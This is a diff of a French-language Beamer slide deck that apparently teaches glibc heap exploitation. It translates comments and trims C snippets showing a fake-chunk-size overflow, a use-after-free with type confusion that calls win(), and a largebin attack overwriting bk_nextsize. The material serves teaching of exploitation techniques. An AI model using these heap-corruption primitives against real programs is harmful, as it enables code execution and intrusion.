@@ -757,7 +757,7 @@
     \vspace{-0.5em}
     \begin{ccode}
         long *p1 = malloc(0x80-8); long *p2 = malloc(0x500-8);
-        long *p3 = malloc(0x80-8); malloc(0x10); // guard
+        long *p3 = malloc(0x80-8); malloc(0x10); // Chunk de garde
 
         *(p2 - 1) = 0x581; // OVERFLOW (fake_size = 0x500 + 0x80 + 1)
         free(p2); // p2 dans l'Unsorted Bin avec fausse taille
@@ -801,7 +801,7 @@
         free(task); // UAF: dangling pointer !
 
         msg_t *msg = malloc(sizeof(msg_t)); // Allocation même taille
-        *(long *)msg->content = (long)win;  // Type Confusion
+        *(long *)msg->content = (long)win;  // Confusion de type
 
         task->execute(); // Exécute win() !
     \end{ccode}
@@ -810,7 +810,7 @@
 \begin{frame}[fragile]{Largebin attack(1 /3)}
     \begin{ccode}
         int main(){
-                /* Disable IO buffering to prevent stream from interfering with heap */
+                /* Désactiver l'I/O buffering pour protéger la heap */
                 setvbuf(stdin, NULL, _IONBF, 0);
                 setvbuf(stdout, NULL, _IONBF, 0);
                 setvbuf(stderr, NULL, _IONBF, 0);
@@ -823,7 +823,7 @@
                 size_t *g3 = malloc(0x438);
                 free(p2);
 
-                p1[3] = (size_t)((&target) - 4); /* Overwrite metadata pointer */
+                p1[3] = (size_t)((&target) - 4); /* Écrasement pointeur métadonnées */
                 size_t *g4 = malloc(0x438);
                 assert((size_t)(p2 - 2) == target);
                 return 0;
@@ -834,13 +834,14 @@
 \begin{frame}[fragile]{Largebin attack(2 /3)}
     \begin{ccode}
         int main(){
+                // ... setup omitted ...
                 size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
                 size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
 
                 free(p1);
                 size_t *g3 = malloc(0x438);
                 free(p2);
-
+                // ...
             }
     \end{ccode}
 
@@ -908,11 +909,14 @@
 
 \begin{frame}[fragile]{Largebin attack(3 /3)}
     \begin{ccode}
-        int main()
-        {
-                /* Overwrite metadata pointer */
+        int main() {
+                // ... allocations & frees omitted ...
+                
+                /* Overwrite metadata pointer (bk_nextsize) */
                 p1[3] = (size_t)((&target) - 4);
                 size_t *g4 = malloc(0x438);
+                
+                // target -> p2
             }
     \end{ccode}
 
@@ -972,7 +976,7 @@
         % corruption flèche p1 → target (slide 2)
         \visible<2>{
             \draw[nextarrow] (p1.north) -- (target.south)
-            node[midway, right]{overwrite fd\_nextsize};
+            node[midway, right]{écrasement fd\_nextsize};
         }
 
         % ===========================
